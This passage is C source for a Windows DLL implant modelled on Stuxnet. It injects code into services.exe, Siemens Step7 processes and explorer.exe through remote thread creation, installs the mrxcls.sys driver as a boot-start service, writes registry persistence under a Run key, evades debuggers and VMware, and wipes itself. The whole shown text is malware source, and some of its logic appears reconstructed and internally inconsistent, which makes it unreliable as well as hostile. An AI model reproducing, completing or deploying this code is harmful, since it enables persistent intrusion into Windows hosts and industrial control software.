    dwRandom = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(ULONG_PTR)pDecrypted;
    wsprintfW(szAslrPath + wcslen(szAslrPath), L"%08x", dwRandom);
    wcscat_s(szAslrPath, OEM7A_MAX_PATH, L".dll");
    if (!CopyFileW(g_Oem7aCtx.szModulePath, szAslrPath, FALSE)) {
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    hModule = LoadLibraryW(szAslrPath);
    if (!hModule) {
        DeleteFileW(szAslrPath);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    pExport = GetProcAddress(hModule, "Export15");
    if (pExport) {
        ((void (*)(void))pExport)();
        g_dwPELoadCount++;
    }
    DeleteFileW(szAslrPath);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return TRUE;
}

static BOOL OEM7A_InjectIntoProcess(DWORD dwPID, PBYTE pDLL, DWORD dwDLLSize, WORD wExportFunction) {
    HANDLE hProcess;
    PVOID pRemoteBase;
    SIZE_T RegionSize;
    ULONG OldProtect;
    HANDLE hThread;
    NTSTATUS status;
    DWORD dwExportOffset;
    if (!pDLL || dwDLLSize == 0) return FALSE;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return FALSE;
    RegionSize = dwDLLSize + OEM7A_PE_LOADER_SIZE;
    pRemoteBase = NULL;
    status = pNtAllocateVirtualMemory(
        hProcess,
        &pRemoteBase,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        CloseHandle(hProcess);
        return FALSE;
    }
    status = pNtWriteVirtualMemory(
        hProcess,
        pRemoteBase,
        pDLL,
        dwDLLSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        pNtFreeVirtualMemory(hProcess, &pRemoteBase, &RegionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    status = pNtWriteVirtualMemory(
        hProcess,
        (PBYTE)pRemoteBase + dwDLLSize,
        g_PELoaderStub,
        OEM7A_PE_LOADER_SIZE,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        pNtFreeVirtualMemory(hProcess, &pRemoteBase, &RegionSize, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    dwExportOffset = 0;
    if (wExportFunction == 1) {
        dwExportOffset = 0x1000;
    } else if (wExportFunction == 2) {
        dwExportOffset = 0x2000;
    }
    status = pNtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (PBYTE)pRemoteBase + dwDLLSize + dwExportOffset,
        pRemoteBase,
        0,
        0,
        0,
        0,
        NULL
    );
    if (NT_SUCCESS(status)) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        g_dwInjectionCount++;
    }
    pNtFreeVirtualMemory(hProcess, &pRemoteBase, &RegionSize, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

static BOOL OEM7A_BuildDriverConfig(VOID) {
    OEM7A_INJECTION_ELEMENT *pElement;
    g_DriverConfig.dwNumberOfInjections = 4;
    pElement = &g_DriverConfig.Elements[0];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 1;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"services.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"services.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7A.PNF");
    pElement = &g_DriverConfig.Elements[1];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 2;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"S7tgtopx.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"S7tgtopx.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7A.PNF");
    pElement = &g_DriverConfig.Elements[2];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 2;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"CCProjectMgr.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"CCProjectMgr.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7A.PNF");
    pElement = &g_DriverConfig.Elements[3];
    pElement->dwReserved1 = 0;
    pElement->wExportFunction = 2;
    pElement->wFlags = 3;
    pElement->dwKey = OEM7A_ENCRYPTION_KEY;
    pElement->dwReserved2 = 0;
    pElement->dwProcessNameLength = wcslen(L"explorer.exe") * 2;
    wcscpy_s(pElement->wszProcessName, 64, L"explorer.exe");
    pElement->dwFileNameLength = wcslen(L"\\SystemRoot\\inf\\oem7m.PNF") * 2;
    wcscpy_s(pElement->wszFileName, 64, L"\\SystemRoot\\inf\\oem7m.PNF");
    return TRUE;
}

static BOOL OEM7A_WriteDriverConfig(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    BYTE encrypted[4096];
    DWORD dwEncryptedSize = 4096;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\MRxCls", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Data", 0, REG_BINARY, (BYTE*)&g_DriverConfig, sizeof(g_DriverConfig));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL OEM7A_LoadMrxCls(VOID) {
    HANDLE hSCManager;
    HANDLE hService;
    WCHAR szPath[OEM7A_MAX_PATH];
    wsprintfW(szPath, L"%s\\drivers\\mrxcls.sys", g_Oem7aCtx.szSystemPath);
    hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) return FALSE;
    hService = CreateServiceW(hSCManager, L"MRxCls", L"MRxCls", SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_BOOT_START, SERVICE_ERROR_NORMAL, szPath, NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        hService = OpenServiceW(hSCManager, L"MRxCls", SERVICE_ALL_ACCESS);
        if (!hService) {
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }
    StartServiceW(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return TRUE;
}

static BOOL OEM7A_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szPath[OEM7A_MAX_PATH];
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"19790509", 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    GetModuleFileNameW(NULL, szPath, OEM7A_MAX_PATH);
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, L"Stuxnet", 0, REG_SZ, (BYTE*)szPath, (DWORD)(wcslen(szPath) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL OEM7A_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, L"19790509", NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI OEM7A_WorkerThread(LPVOID lpParam) {
    DWORD dwTick;
    dwTick = GetTickCount();
    while (WaitForSingleObject(g_Oem7aCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM7A_IsExpired()) {
            break;
        }
        if (!OEM7A_ReadRegistry()) {
            OEM7A_WriteRegistry();
        }
        g_dwInfectionCount++;
        dwTick = GetTickCount();
    }
    return 0;
}

static BOOL OEM7A_StartWorker(VOID) {
    g_Oem7aCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Oem7aCtx.hStopEvent) return FALSE;
    g_Oem7aCtx.hThread = CreateThread(NULL, 0, OEM7A_WorkerThread, NULL, 0, NULL);
    if (!g_Oem7aCtx.hThread) {
        CloseHandle(g_Oem7aCtx.hStopEvent);
        g_Oem7aCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM7A_StopWorker(VOID) {
    if (g_Oem7aCtx.hStopEvent) {
        SetEvent(g_Oem7aCtx.hStopEvent);
    }
    if (g_Oem7aCtx.hThread) {
        WaitForSingleObject(g_Oem7aCtx.hThread, 5000);
        CloseHandle(g_Oem7aCtx.hThread);
        g_Oem7aCtx.hThread = NULL;
    }
    if (g_Oem7aCtx.hStopEvent) {
        CloseHandle(g_Oem7aCtx.hStopEvent);
        g_Oem7aCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL OEM7A_SelfDestruct(VOID) {
    WCHAR szPath[OEM7A_MAX_PATH];
    HANDLE hFile;
    BYTE buffer[4096];
    DWORD dwWritten;
    DWORD i;
    GetModuleFileNameW(NULL, szPath, OEM7A_MAX_PATH);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        ZeroMemory(buffer, 4096);
        for (i = 0; i < 10; i++) {
            SetFilePointer(hFile, i * 4096, NULL, FILE_BEGIN);
            WriteFile(hFile, buffer, 4096, &dwWritten, NULL);
        }
        CloseHandle(hFile);
    }
    DeleteFileW(szPath);
    DeleteFileW(g_Oem7aCtx.szPNFPath);
    return TRUE;
}

static BOOL OEM7A_Execute(VOID) {
    HANDLE hMutex;
    if (!OEM7A_Init()) return FALSE;
    if (OEM7A_IsExpired()) {
        OEM7A_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        OEM7A_Cleanup();
        return FALSE;
    }
    if (OEM7A_CheckDebugger()) {
        CloseHandle(hMutex);
        OEM7A_Cleanup();
        return FALSE;
    }
    if (OEM7A_CheckVMware()) {
        CloseHandle(hMutex);
        OEM7A_Cleanup();
        return FALSE;
    }
    OEM7A_WriteRegistry();
    OEM7A_ReadRegistry();
    OEM7A_BuildPELoader();
    OEM7A_ExtractAndSavePNF();
    OEM7A_BuildDriverConfig();
    OEM7A_WriteDriverConfig();
    OEM7A_LoadMrxCls();
    OEM7A_LoadMainDLL();
    OEM7A_StartWorker();
    while (WaitForSingleObject(g_Oem7aCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM7A_IsExpired()) {
            break;
        }
        OEM7A_LoadMainDLL();
    }
    OEM7A_StopWorker();
    OEM7A_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            OEM7A_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OEM7A_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!OEM7A_ReadPNFFromDisk(g_Oem7aCtx.szPNFPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pEncrypted;
    PBYTE pDecrypted;
    DWORD dwEncryptedSize;
    DWORD dwDecryptedSize;
    if (!OEM7A_ReadPNFFromDisk(g_Oem7aCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    if (!OEM7A_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pDecrypted);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    return OEM7A_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return OEM7A_LoadMainDLL() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return OEM7A_BuildDriverConfig() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return OEM7A_WriteDriverConfig() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    return OEM7A_LoadMrxCls() ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    return OEM7A_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return OEM7A_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return OEM7A_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    OEM7A_StopWorker();
    return 0;
}

DWORD WINAPI Export13(VOID) {
    OEM7A_SelfDestruct();
    return 0;
}

DWORD WINAPI Export14(VOID) {
    return (DWORD)g_Oem7aCtx.dwPid;
}

DWORD WINAPI Export15(VOID) {
    return OEM7A_VERSION;
}

DWORD WINAPI Export16(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export17(VOID) {
    return g_dwInjectionCount;
}

DWORD WINAPI Export18(VOID) {
    return g_dwDecryptionCount;
}

DWORD WINAPI Export19(VOID) {
    return g_dwPELoadCount;
}

DWORD WINAPI Export20(VOID) {
    return (DWORD)g_Oem7aCtx.hMutex;
}
